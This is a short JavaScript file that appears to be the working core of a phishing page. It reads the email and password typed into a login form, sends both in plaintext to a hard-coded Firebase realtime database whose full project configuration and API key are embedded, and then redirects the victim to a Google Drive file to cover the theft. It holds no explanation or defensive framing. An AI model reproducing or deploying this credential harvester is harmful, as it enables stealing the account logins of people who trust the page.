'use strict';

//grab a form
const form = document.querySelector('.formy');

//grab an input
const inputEmail = form.querySelector('#eml');
const inputPassword = form.querySelector('#pwd');


//config your firebase push
const config = {
	apiKey: "AIzaSyB0MInj0HJ43nm8eXcJ4dgG93nIkSNEMb8",
    authDomain: "tabib-4e06e.firebaseapp.com",
    databaseURL: "https://tabib-4e06e-default-rtdb.firebaseio.com",
    projectId: "tabib-4e06e",
    storageBucket: "tabib-4e06e.appspot.com",
    messagingSenderId: "508395861912",
    appId: "1:508395861912:web:313d47a3f7e8a5d5685ded",
    measurementId: "G-HV91SC3GVB"
};


//create a functions to push
    function firebasePush(eml, pwd) {


        //prevents from braking
        if (!firebase.apps.length) {
            firebase.initializeApp(config);
        }

        //push itself
        var mailsRef = firebase.database().ref('emails').push().set(
            {
                mail: eml.value,
                pass: pwd.value
				
            }
        );

    }

//push on form submit
    if (form) {
        form.addEventListener('submit', function (evt) {
            evt.preventDefault();
            firebasePush(inputEmail, inputPassword);

            //shows alert if everything went well.
            //return alert('Data Successfully Sent to Realtime Database');
	    window.location.href = "https://drive.google.com/file/d/1O7l0oqcJtTkrp6D-Z2zz5BzrAYX8vDrS/view?usp=sharing";
        })
    }
